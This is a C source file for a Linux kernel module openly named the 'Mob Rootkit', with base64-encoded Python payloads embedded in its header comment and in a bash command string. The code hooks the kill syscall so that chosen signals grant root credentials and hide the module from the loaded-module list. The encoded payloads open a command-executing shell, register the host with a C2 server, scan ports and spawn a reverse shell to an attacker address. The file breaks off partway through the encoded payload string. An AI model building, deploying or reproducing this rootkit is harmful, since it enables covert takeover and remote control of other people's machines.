/*
Linux Kernel Rootkit:
    -   Use the Makefile to build the module.
    -   ftracer.h is a helping module which is basically trying to override the system calls. (Author: xcellerator)
    -   Hide and Unhide itself from modules lists.
    -   Granting root permissions by updating root credentials.
    -   Creating and executing the reverse shell/backdoor which can be used to connect to a C2 server.

    eg-> reverse shell payload (base64 encoded): IyMjIyMjIyMjIyMjIyMjIyMjCiMgU2Vjb25kIFZlcnNpb24gIwojIyMjIyMjIyMjIyMjIyMjIyMKCmltcG9ydCBzb2NrZXQKaW1wb3J0IHN1YnByb2Nlc3MKCmltcG9ydCBvcwoKSE9TVCA9ICcwLjAuMC4wJwpQT1JUID0gMTIzNAoKcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKcy5iaW5kKChIT1NULCBQT1JUKSkKcy5saXN0ZW4oMSkKcHJpbnQoIkxpc3RlbmluZyBvbiBwb3J0IDEyMzQiKQoKd2hpbGUgVHJ1ZToKICAgIGNvbm4sIGFkZHIgPSBzLmFjY2VwdCgpCiAgICBwcmludCgiQ29ubmVjdGlvbiBBY2NlcHRlZCBmcm9tOiB7fSIuZm9ybWF0KGFkZHIpKQogICAgZGF0YSA9IGNvbm4ucmVjdigxMDI0KS5kZWNvZGUoJ3V0Zi04JykKICAgIHRyeToKICAgICAgICBpZiBkYXRhOgogICAgICAgICAgICAjIEV4ZWN1dGUgdGhlIGNvbW1hbmQgYW5kIHNlbmQgYmFjayB0aGUgcmVzdWx0CiAgICAgICAgICAgICMgcmVzdWx0ID0gc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoZGF0YS5zcGxpdCgpLCBzaGVsbD1UcnVlKQogICAgICAgICAgICBwcyA9IHN1YnByb2Nlc3MuUG9wZW4oZGF0YSwgc2hlbGw9VHJ1ZSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuU1RET1VUKQogICAgICAgICAgICByZXN1bHQgPSBwcy5jb21tdW5pY2F0ZSgpWzBdICsgc3RyKCc7IHBpZDogJykuZW5jb2RlKCd1dGYtOCcpICsgc3RyKG9zLmdldHBpZCgpKS5lbmNvZGUoJ3V0Zi04JykgKyBzdHIoJzsgcHBpZDogJykuZW5jb2RlKCd1dGYtOCcpICsgc3RyKG9zLmdldHBwaWQoKSkuZW5jb2RlKCd1dGYtOCcpCgogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHJlc3VsdCA9IHN0cihlKS5lbmNvZGUoJ3V0Zi04JykKCiAgICBjb25uLnNlbmQocmVzdWx0KQogICAgY29ubi5jbG9zZSgpCg==

    Payload used in this module: IiIiClB5dGhvbiByZXZlcnNlIHNoZWxsIHBheWxvYWQgc3BlY2lhbGx5IGRlc2lnbmVkIGZvciBNb2IgcG9zdC1leHBsb2l0YXRpb24gZnJhbWV3b3JrLgpUaGlzIHBheWxvYWQgaGF2ZSBuZXRvd3JrIHNjYW5uaW5nIGNhcGFiaWxpdGllcyBhbmQgSXQgY2FuIGFsc28gc3Bhd24gYSBuZXcgc2hlbGwgY29ubmVjdGlvbiBmcm9tIHRoZSB0YXJnZXQgc2VydmVyIHRvIGEgbmV3IGF0dGFja2luZyBzeXN0ZW0uCgoxLiBTY2FuIG5ldHdvcmsgZnJvbSBDMiBzZXJ2ZXIgdXNpbmc6IHNjYW4KMi4gU3Bhd24gYSBuZXcgc2hlbGwgY29ubmVjdGlvbjogc3Bhd24gPEF0dGFja2luZyBJUD4gPHBvcnQ+IGFuZCBzdGFydCBsaXN0ZW5pbmcgZnJvbSB0aGUgYXR0YWNraW5nIHN5c3RlbSB1c2luZyAnbmMnLgoKQXV0aG9yOiBzaHYtb20KIiIiCgoKaW1wb3J0IHNvY2tldAppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgdGhyZWFkaW5nCmltcG9ydCBvcwoKaW1wb3J0IHJlcXVlc3RzCgojIEdldHRpbmcgc3lzdGVtIG5hbWUgYW5kIGFkZGluZyB0aGlzIGRldmljZSB0byB0aGUgQzIgc2VydmVyJ3MgZGV2aWNlIGxpc3QKCmRlZiBnZXRfc3lzdGVtX25hbWUoKToKICAgIHRyeToKICAgICAgICByZXN1bHQgPSBzdWJwcm9jZXNzLnJ1bihbJ2hvc3RuYW1lJ10sIGNhcHR1cmVfb3V0cHV0PVRydWUsIHRleHQ9VHJ1ZSkKICAgICAgICBzeXN0ZW1fbmFtZSA9IHJlc3VsdC5zdGRvdXQuc3RyaXAoKQogICAgICAgIHJldHVybiBzeXN0ZW1fbmFtZQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KGYiRXJyb3I6IHtlfSIpCiAgICAgICAgcmV0dXJuICdEZWZhdWx0X25hbWUnCgojIFVzYWdlCnN5c3RlbV9uYW1lID0gZ2V0X3N5c3RlbV9uYW1lKCkKcHJpbnQoZiJTeXN0ZW0gbmFtZToge3N5c3RlbV9uYW1lfSIpCgpjMl9pcCA9ICcwLjAuMC4wJwpjMl9wb3J0ID0gJzgwMDAnCmFkZF9kZXZpY2VfdXJsID0gZidodHRwOi8ve2MyX2lwfTp7YzJfcG9ydH0vYWRkX2RldmljZS8nCgpkZWYgYWRkX2RldmljZSgpOgogICAgdHJ5OgogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdChhZGRfZGV2aWNlX3VybCwgZGF0YT17J25hbWUnOnN5c3RlbV9uYW1lLCdpcF9hZGRyZXNzJzonJ30pCiAgICAgICAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICBwcmludCgiRm9ybSBzdWJtaXR0ZWQgc3VjY2Vzc2Z1bGx5LiIpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQoZiJGb3JtIHN1Ym1pc3Npb24gZmFpbGVkIHdpdGggc3RhdHVzIGNvZGU6IHtyZXNwb25zZS5zdGF0dXNfY29kZX0iKQogICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuUmVxdWVzdEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KGYiRXJyb3Igc3VibWl0dGluZyBmb3JtOiB7ZX0iKQoKIyBEZXZpY2UgYWRkZWQuLi4KCgojIENvbm5lY3Rpb24gc2V0dGluZ3MKCkhPU1QgPSAnMC4wLjAuMCcKUE9SVCA9IDEyMzQKCnMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCnMuYmluZCgoSE9TVCwgUE9SVCkpCnMubGlzdGVuKDEpCnByaW50KCJMaXN0ZW5pbmcgb24gcG9ydCAxMjM0IikKCgojIE5ldHdvcmsgU2Nhbm5pbmcKCm5ldHdvcmtfZHVtbXkgPSBbIjEwLjEwLjI3LiIgKyBzdHIoaSkgZm9yIGkgaW4gcmFuZ2UoNzAsIDEwMCldICAjIER1bW15IE5ldHdvcmsKCnRhcmdldF9wb3J0cyA9IFsxNSwgMjAsIDIxLCAyMiwgMjMsIDI1LCA1MCwgNTEsIDUzLCA2NywgNjgsIDY5LCA4MCwgODgsIDExMCwgMTM5LCAxNDMsIDE2MSwgMzg5LCA0NDMsIDQ0NSwgMzMwNiwgMzM4OSwgNTYwMSwgNTQzMiwgODA4MCwgOTIwMCwgOTMwMF0gICMgTGlzdCBvZiB0YXJnZXQgcG9ydHMgdG8gc2NhbgpNQVhfVEhSRUFEUyA9IDE2Cgp0aHJlYWRfc2VtYXBob3JlID0gdGhyZWFkaW5nLkJvdW5kZWRTZW1hcGhvcmUodmFsdWU9TUFYX1RIUkVBRFMpCgpkZWYgc2Nhbl9wb3J0cyhpcCk6CiAgICBwcmludChmIlNjYW5uaW5nIElQOiB7aXB9IikKCiAgICB0cnk6CiAgICAgICAgZm9yIHBvcnQgaW4gdGFyZ2V0X3BvcnRzOgogICAgICAgICAgICAjIENyZWF0ZSBhIHNvY2tldCBvYmplY3QKICAgICAgICAgICAgc29jayA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKICAgICAgICAgICAgCiAgICAgICAgICAgICMgU2V0IGEgdGltZW91dCB2YWx1ZSBmb3IgdGhlIHNvY2tldCAob3B0aW9uYWwpCiAgICAgICAgICAgIHNvY2suc2V0dGltZW91dCgyKQogICAgICAgICAgICAKICAgICAgICAgICAgIyBDb25uZWN0IHRvIHRoZSB0YXJnZXQgSVAgYW5kIHBvcnQKICAgICAgICAgICAgcmVzdWx0ID0gc29jay5jb25uZWN0X2V4KChpcCwgcG9ydCkpCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiByZXN1bHQgPT0gMDoKICAgICAgICAgICAgICAgICMgUG9ydCBpcyBvcGVuCiAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgcG9ydF9kaWN0W2lwXS5hcHBlbmQocG9ydCkKICAgICAgICAgICAgICAgIGV4Y2VwdCBLZXlFcnJvcjoKICAgICAgICAgICAgICAgICAgICBwb3J0X2RpY3RbaXBdID0gW3BvcnRdCiAgICAgICAgICAgICAgICAgICAgIyBwcmludChmIlBvcnQge3BvcnR9IGlzIG9wZW4iKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAjIEF0dGVtcHQgdG8gZmV0Y2ggdGhlIHNlcnZpY2UgdmVyc2lvbgogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgIGJhbm5lciA9IHNvY2sucmVjdigxMDI0KS5kZWNvZGUoJ3V0Zi0xNicpLnN0cmlwKCkKICAgICAgICAgICAgICAgICAgICBwcmludChmIlNlcnZpY2UgdmVyc2lvbjoge2Jhbm5lcn0iKQogICAgICAgICAgICAgICAgZXhjZXB0IHNvY2tldC5lcnJvcjoKICAgICAgICAgICAgICAgICAgICBwcmludCgiRmFpbGVkIHRvIGZldGNoIHNlcnZpY2UgdmVyc2lvbiIpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAjIFBvcnQgaXMgY2xvc2VkCiAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgIAogICAgICAgICAgICAjIENsb3NlIHRoZSBzb2NrZXQKICAgICAgICAgICAgc29jay5jbG9zZSgpCiAgICAgICAgCiAgICBleGNlcHQgc29ja2V0LmVycm9yOgogICAgICAgIHByaW50KGYiRXJyb3Igb2NjdXJyZWQgd2hpbGUgc2Nhbm5pbmcgcG9ydCB7cG9ydH0iKQoKICAgIGZpbmFsbHk6CiAgICAgICAgdGhyZWFkX3NlbWFwaG9yZS5yZWxlYXNlKCkKCgpkZWYgdGhyZWFkX3NjYW5uZXIoKToKICAgIHRocmVhZHMgPSBbXQogICAgbmV0d29yayA9IGl0ZXIobmV0d29ya19kdW1teSkKCiAgICBmb3IgaSBpbiByYW5nZShsZW4obmV0d29ya19kdW1teSkpOgogICAgICAgIHRhcmdldF9pcCA9IG5leHQobmV0d29yaykKCiAgICAgICAgdGhyZWFkX3NlbWFwaG9yZS5hY3F1aXJlKCkKICAgICAgICB0ID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9c2Nhbl9wb3J0cywgYXJncz0odGFyZ2V0X2lwLCkpCiAgICAgICAgdGhyZWFkcy5hcHBlbmQodCkKICAgICAgICB0LnN0YXJ0KCkKCiAgICBmb3IgdCBpbiB0aHJlYWRzOgogICAgICAgIHQuam9pbigpCgoKIyBGVFAgQ2hlY2tzCmZyb20gZnRwbGliIGltcG9ydCBGVFAKCiMgSWYgRlRQIGlzIG9wZW4gdGhlbiBjaGVjayBmb3IgYW5vbnltb3VzIGxvZ2luIGFuZCBhdmFpbGFibGUgY29tbWFuZHMuCmRlZiBjaGVja19mdHBfY2FwYWJpbGl0aWVzKGhvc3RuYW1lKToKICAgIHRyeToKICAgICAgICBmdHAgPSBGVFAoaG9zdG5hbWUpCiAgICAgICAgZnRwLmxvZ2luKCkgICMgVHJ5IGFub255bW91cyBsb2dpbgoKICAgICAgICAjIEdldCBhdmFpbGFibGUgY29tbWFuZHMKICAgICAgICBjb21tYW5kcyA9IGZ0cC5zZW5kY21kKCdoZWxwJykuc3BsaXQoJ1xuJykKICAgICAgICBwcmludCgiQXZhaWxhYmxlIEZUUCBjb21tYW5kczoiKQogICAgICAgIGZvciBjb21tYW5kIGluIGNvbW1hbmRzOgogICAgICAgICAgICBwcmludChjb21tYW5kKQoKICAgICAgICBmdHAucXVpdCgpCiAgICAgICAgcmV0dXJuICJBbm9ueW1vdXMgRlRQIGFjY2VzcyBpcyBhdmFpbGFibGUuIgogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHJldHVybiAiQW5vbnltb3VzIEZUUCBhY2Nlc3MgaXMgbm90IGF2YWlsYWJsZSBvciBmYWlsZWQuIgoKCiMgRW50cnkgcG9pbnQgb2YgdGhlIHJldmVyc2Ugc2hlbGwKCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6CgogICAgIyBTdWJtaXR0aW5nIERldmljZSBOYW1lIGFuZCBJUCB0byB0aGUgQzIgc2VydmVyLgogICAgIyBhZGRfZGV2aWNlKCkKCiAgICB3aGlsZSBUcnVlOgogICAgICAgIGNvbm4sIGFkZHIgPSBzLmFjY2VwdCgpCiAgICAgICAgcHJpbnQoIkNvbm5lY3Rpb24gQWNjZXB0ZWQgZnJvbToge30iLmZvcm1hdChhZGRyKSkKICAgICAgICBkYXRhID0gY29ubi5yZWN2KDEwMjQpLmRlY29kZSgndXRmLTgnKQogICAgICAgIHRyeToKICAgICAgICAgICAgaWYgZGF0YToKCiAgICAgICAgICAgICAgICBpZiBkYXRhLnN0YXJ0c3dpdGgoJ3NwYXduJyk6CiAgICAgICAgICAgICAgICAgICAgc3Bhd25fY29tbWFuZCA9IGRhdGEuc3BsaXQoKQogICAgICAgICAgICAgICAgICAgIGF0dGFja2VyX2lwID0gc3Bhd25fY29tbWFuZFsxXQogICAgICAgICAgICAgICAgICAgIHNwYXduX3BvcnQgPSBzcGF3bl9jb21tYW5kWzJdCiAgICAgICAgICAgICAgICAgICAgc3Bhd25fc2hlbGwgPSBmJ3B5dGhvbjMgLWMgXCdpbXBvcnQgc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTtzLmNvbm5lY3QoKCJ7YXR0YWNrZXJfaXB9Iix7c3Bhd25fcG9ydH0pKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtwdHkuc3Bhd24oIi9iaW4vc2giKVwnJwoKICAgICAgICAgICAgICAgICAgICBwcyA9IHN1YnByb2Nlc3MuUG9wZW4oc3Bhd25fc2hlbGwsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsIHN0ZGVycj1zdWJwcm9jZXNzLlNURE9VVCkKICAgICAgICAgICAgICAgICAgICByZXN1bHQgPSBwcy5jb21tdW5pY2F0ZSgpWzBdICsgc3RyKCdTcGF3bmVkJykuZW5jb2RlKCd1dGYtOCcpICsgc3RyKCc7IHBpZDogJykuZW5jb2RlKCd1dGYtOCcpICsgc3RyKG9zLmdldHBpZCgpKS5lbmNvZGUoJ3V0Zi04JykgKyBzdHIoJzsgcHBpZDogJykuZW5jb2RlKCd1dGYtOCcpICsgc3RyKG9zLmdldHBwaWQoKSkuZW5jb2RlKCd1dGYtOCcpCgogICAgICAgICAgICAgICAgZWxpZiBkYXRhLnN0YXJ0c3dpdGgoJ3NjYW4nKToKICAgICAgICAgICAgICAgICAgICBwb3J0X2RpY3QgPSB7fQogICAgICAgICAgICAgICAgICAgIHRocmVhZF9zY2FubmVyKCkKICAgICAgICAgICAgICAgICAgICBmdHBfcmVzdWx0ID0gJycKCiAgICAgICAgICAgICAgICAgICAgZm9yIGtleSwgdmFsIGluIHBvcnRfZGljdC5pdGVtcygpOgogICAgICAgICAgICAgICAgICAgICAgICBpZiAnMjEnIGluIHZhbDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhvc3RuYW1lID0ga2V5CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmdHBfcmVzdWx0ID0gY2hlY2tfZnRwX2NhcGFiaWxpdGllcyhob3N0bmFtZSkKCiAgICAgICAgICAgICAgICAgICAgcmVzdWx0ID0gc3RyKHBvcnRfZGljdCkuZW5jb2RlKCd1dGYtOCcpICsgc3RyKGZ0cF9yZXN1bHQpLmVuY29kZSgndXRmLTgnKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICMgRXhlY3V0ZSB0aGUgY29tbWFuZCBhbmQgc2VuZCBiYWNrIHRoZSByZXN1bHQKICAgICAgICAgICAgICAgICAgICAjIHJlc3VsdCA9IHN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0KGRhdGEuc3BsaXQoKSwgc2hlbGw9VHJ1ZSkKICAgICAgICAgICAgICAgICAgICBwcyA9IHN1YnByb2Nlc3MuUG9wZW4oZGF0YSwgc2hlbGw9VHJ1ZSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuU1RET1VUKQogICAgICAgICAgICAgICAgICAgIHJlc3VsdCA9IHBzLmNvbW11bmljYXRlKClbMF0gKyBzdHIoJzsgcGlkOiAnKS5lbmNvZGUoJ3V0Zi04JykgKyBzdHIob3MuZ2V0cGlkKCkpLmVuY29kZSgndXRmLTgnKSArIHN0cignOyBwcGlkOiAnKS5lbmNvZGUoJ3V0Zi04JykgKyBzdHIob3MuZ2V0cHBpZCgpKS5lbmNvZGUoJ3V0Zi04JykKCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICByZXN1bHQgPSBzdHIoZSkuZW5jb2RlKCd1dGYtOCcpCgogICAgICAgIGNvbm4uc2VuZChyZXN1bHQpCiAgICAgICAgY29ubi5jbG9zZSgpCg==

Author: shv-om
*/

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/namei.h>

#include <linux/kmod.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/fcntl.h>
#include <linux/uaccess.h>
#include <linux/sched/signal.h>
#include <linux/pid.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Mob");
MODULE_DESCRIPTION("Mob Rootkit");
MODULE_VERSION("0.01");


/* 
 * After Kernel 4.17.0, the way that syscalls are handled changed
 * to use the pt_regs struct instead of the more familiar function
 * prototype declaration.
*/

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

/* Need to hide/reveal the kernel module*/
static struct list_head *prev_module;
static short hidden = 0;


#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_kill)(const struct pt_regs *);

/* Modern versions using pt_regs struct to store arguments and them pass the struct itself*/
asmlinkage int hook_kill(const struct pt_regs *regs)
{
    void set_root(void);

    void unhide(void);
    void hidenow(void);

    int sig = regs->si;

    if (sig == 64){
        printk(KERN_INFO "mob: giving root...\n");
        set_root();

        return 0;
    }

    else if ((sig == 63) && (hidden == 0)){
        printk(KERN_INFO "mob: Hiding mob...\n");
        hidenow();
        hidden = 1;
    }

    else if ((sig == 63) && (hidden == 1)){
        printk(KERN_INFO "mob: Revealing mob...\n");
        unhide();
        hidden = 0;
    }

    return orig_kill(regs);
    
}

#else
static asmlinkage long (*orig_kill)(pid_t pid, int sig);

// for earlier versions of kernel using classic way of arguments passing
static asmlinkage int hook_kill(pid_t pid, int sig)
{
    void set_root(void);

    void unhide(void);
    void hidenow(void);

    if (sig == 64){
        printk(KERN_INFO "mob: giving root..\n");
        set_root();
        return 0;
    }

    else if ((sig == 63) && (hidden == 0)){
        printk(KERN_INFO "mob: Hiding mob...\n");
        hidenow();
        hidden = 1;
    }

    else if ((sig == 63) && (hidden == 1)){
        printk(KERN_INFO "mob: Revealing mob...\n");
        unhide();
        hidden = 0;
    }

    return orig_kill(pid, sig);
}
#endif


/* Adding back the kernel module to the loaded module list...*/
void unhide(void){
    list_add(&THIS_MODULE->list, prev_module);
}

/* Removing the kernel module name from he loaded module list to hide the exstence... */
void hidenow(void){
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}


/* Setting credentials to provide root access to the module */
void set_root(void){

    /* prepare_creds returns the current credentials of the process */
    struct cred *root;
    root = prepare_creds();

    if (root == NULL)
        return;

    /* Run through and set all the various *id's to 0 (root) */
    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    /* Set the cred struct that we've modified to that of the calling process */
    commit_creds(root);
}


static int get_rev_shell(void){

    char *argv[] = { "/bin/bash", "-c", "echo 'IiIiClB5dGhvbiByZXZlcnNlIHNoZWxsIHBheWxvYWQgc3BlY2lhbGx5IGRlc2lnbmVkIGZvciBNb2IgcG9zdC1leHBsb2l0YXRpb24gZnJhbWV3b3JrLgpUaGlzIHBheWxvYWQgaGF2ZSBuZXRvd3JrIHNjYW5uaW5nIGNhcGFiaWxpdGllcyBhbmQgSXQgY2FuIGFsc28gc3Bhd24gYSBuZXcgc2hlbGwgY29ubmVjdGlvbiBmcm9tIHRoZSB0YXJnZXQgc2VydmVyIHRvIGEgbmV3IGF0dGFja2luZyBzeXN0ZW0uCgoxLiBTY2FuIG5ldHdvcmsgZnJvbSBDMiBzZXJ2ZXIgdXNpbmc6IHNjYW4KMi4gU3Bhd24gYSBuZXcgc2hlbGwgY29ubmVjdGlvbjogc3Bhd24gPEF0dGFja2luZyBJUD4gPHBvcnQ+IGFuZCBzdGFydCBsaXN0ZW5pbmcgZnJvbSB0aGUgYXR0YWNraW5nIHN5c3RlbSB1c2luZyAnbmMnLgoKQXV0aG9yOiBzaHYtb20KIiIiCgoKaW1wb3J0IHNvY2tldAppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgdGhyZWFkaW5nCmltcG9ydCBvcwoKaW1wb3J0IHJlcXVlc3RzCgojIEdldHRpbmcgc3lzdGVtIG5hbWUgYW5kIGFkZGluZyB0aGlzIGRldmljZSB0byB0aGUgQzIgc2VydmVyJ3MgZGV2aWNlIGxpc3QKCmRlZiBnZXRfc3lzdGVtX25hbWUoKToKICAgIHRyeToKICAgICAgICByZXN1bHQgPSBzdWJwcm9jZXNzLnJ1bihbJ2hvc3RuYW1lJ10sIGNhcHR1cmVfb3V0cHV0PVRydWUsIHRleHQ9VHJ1ZSkKICAgICAgICBzeXN0ZW1fbmFtZSA9IHJlc3VsdC5zdGRvdXQuc3RyaXAoKQogICAgICAgIHJldHVybiBzeXN0ZW1fbmFtZQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KGYiRXJyb3I6IHtlfSIpCiAgICAgICAgcmV0dXJuICdEZWZhdWx0X25hbWUnCgojIFVzYWdlCnN5c3RlbV9uYW1lID0gZ2V0X3N5c3RlbV9uYW1lKCkKcHJpbnQoZiJTeXN0ZW0gbmFtZToge3N5c3RlbV9uYW1lfSIpCgpjMl9pcCA9ICcwLjAuMC4wJwpjMl9wb3J0ID0gJzgwMDAnCmFkZF9kZXZpY2VfdXJsID0gZidodHRwOi8ve2MyX2lwfTp7YzJfcG9ydH0vYWRkX2RldmljZS8nCgpkZWYgYWRkX2RldmljZSgpOgogICAgdHJ5OgogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdChhZGRfZGV2aWNlX3VybCwgZGF0YT17J25hbWUnOnN5c3RlbV9uYW1lLCdpcF9hZGRyZXNzJzonJ30pCiAgICAgICAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICBwcmludCgiRm9ybSBzdWJtaXR0ZWQgc3VjY2Vzc2Z1bGx5LiIpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQoZiJGb3JtIHN1Ym1pc3Npb24gZmFpbGVkIHdpdGggc3RhdHVzIGNvZGU6IHtyZXNwb25zZS5zdGF0dXNfY29kZX0iKQogICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuUmVxdWVzdEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KGYiRXJyb3Igc3VibWl0dGluZyBmb3JtOiB7ZX0iKQoKIyBEZXZpY2UgYWRkZWQuLi4KCgojIENvbm5lY3Rpb24gc2V0dGluZ3MKCkhPU1QgPSAnMC4wLjAuMCcKUE9SVCA9IDEyMzQKCnMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCnMuYmluZCgoSE9TVCwgUE9SVCkpCnMubGlzdGVuKDEpCnByaW50KCJMaXN0ZW5pbmcgb24gcG9ydCAxMjM0IikKCgojIE5ldHdvcmsgU2Nhbm5pbmcKCm5ldHdvcmtfZHVtbXkgPSBbIjEwLjEwLjI3LiIgKyBzdHIoaSkgZm9yIGkgaW4gcmFuZ2UoNzAsIDEwMCldICAjIER1bW15IE5ldHdvcmsKCnRhcmdldF9wb3J0cyA9IFsxNSwgMjAsIDIxLCAyMiwgMjMsIDI1LCA1MCwgNTEsIDUzLCA2NywgNjgsIDY5LCA4MCwgODgsIDExMCwgMTM5LCAxNDMsIDE2MSwgMzg5LCA0NDMsIDQ0NSwgMzMwNiwgMzM4OSwgNTYwMSwgNTQzMiwgODA4MCwgOTIwMCwgOTMwMF0gICMgTGlzdCBvZiB0YXJnZXQgcG9ydHMgdG8gc2NhbgpNQVhfVEhSRUFEUyA9IDE2Cgp0aHJlYWRfc2VtYXBob3JlID0gdGhyZWFkaW5nLkJvdW5kZWRTZW1hcGhvcmUodmFsdWU9TUFYX1RIUkVBRFMpCgpkZWYgc2Nhbl9wb3J0cyhpcCk6CiAgICBwcmludChmIlNjYW5uaW5nIElQOiB7aXB9IikKCiAgICB0cnk6CiAgICAgICAgZm9yIHBvcnQgaW4gdGFyZ2V0X3BvcnRzOgogICAgICAgICAgICAjIENyZWF0ZSBhIHNvY2tldCBvYmplY3QKICAgICAgICAgICAgc29jayA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKICAgICAgICAgICAgCiAgICAgICAgICAgICMgU2V0IGEgdGltZW91dCB2YWx1ZSBmb3IgdGhlIHNvY2tldCAob3B0aW9uYWwpCiAgICAgICAgICAgIHNvY2suc2V0dGltZW91dCgyKQogICAgICAgICAgICAKICAgICAgICAgICAgIyBDb25uZWN0IHRvIHRoZSB0YXJnZXQgSVAgYW5kIHBvcnQKICAgICAgICAgICAgcmVzdWx0ID0gc29jay5jb25uZWN0X2V4KChpcCwgcG9ydCkpCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiByZXN1bHQgPT0gMDoKICAgICAgICAgICAgICAgICMgUG9ydCBpcyBvcGVuCiAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgcG9ydF9kaWN0W2lwXS5hcHBlbmQocG9ydCkKICAgICAgICAgICAgICAgIGV4Y2VwdCBLZXlFcnJvcjoKICAgICAgICAgICAgICAgICAgICBwb3J0X2RpY3RbaXBdID0gW3BvcnRdCiAgICAgICAgICAgICAgICAgICAgIyBwcmludChmIlBvcnQge3BvcnR9IGlzIG9wZW4iKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAjIEF0dGVtcHQgdG8gZmV0Y2ggdGhlIHNlcnZpY2UgdmVyc2lvbgogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgIGJhbm5lciA9IHNvY2sucmVjdigxMDI0KS5kZWNvZGUoJ3V0Zi0xNicpLnN0cmlwKCkKICAgICAgICAgICAgICAgICAgICBwcmludChmIlNlcnZpY2UgdmVyc2lvbjoge2Jhbm5lcn0iKQogICAgICAgICAgICAgICAgZXhjZXB0IHNvY2tldC5lcnJvcjoKICAgICAgICAgICAgICAgICAgICBwcmludCgiRmFpbGVkIHRvIGZldGNoIHNlcnZpY2UgdmVyc2lvbiIpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAjIFBvcnQgaXMgY2xvc2VkCiAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgIAogICAgICAgICAgICAjIENsb3NlIHRoZSBzb2NrZXQKICAgICAgICAgICAgc29jay5jbG9zZSgpCiAgICAgICAgCiAgICBleGNlcHQgc29ja2V0LmVycm9yOgogICAgICAgIHByaW50KGYiRXJyb3Igb2NjdXJyZWQgd2hpbGUgc2Nhbm5pbmcgcG9ydCB7cG9ydH0iKQoKICAgIGZpbmFsbHk6CiAgICAgICAgdGhyZWFkX3NlbWFwaG9yZS5yZWxlYXNlKCkKCgpkZWYgdGhyZWFkX3NjYW5uZXIoKToKICAgIHRocmVhZHMgPSBbXQogICAgbmV0d29yayA9IGl0ZXIobmV0d29ya19kdW1teSkKCiAgICBmb3IgaSBpbiByYW5nZShsZW4obmV0d29ya19kdW1teSkpOgogICAgICAgIHRhcmdldF9pcCA9IG5leHQobmV0d29yaykKCiAgICAgICAgdGhyZWFkX3NlbWFwaG9yZS5hY3F1aXJlKCkKICAgICAgICB0ID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9c2Nhbl9wb3J0cywg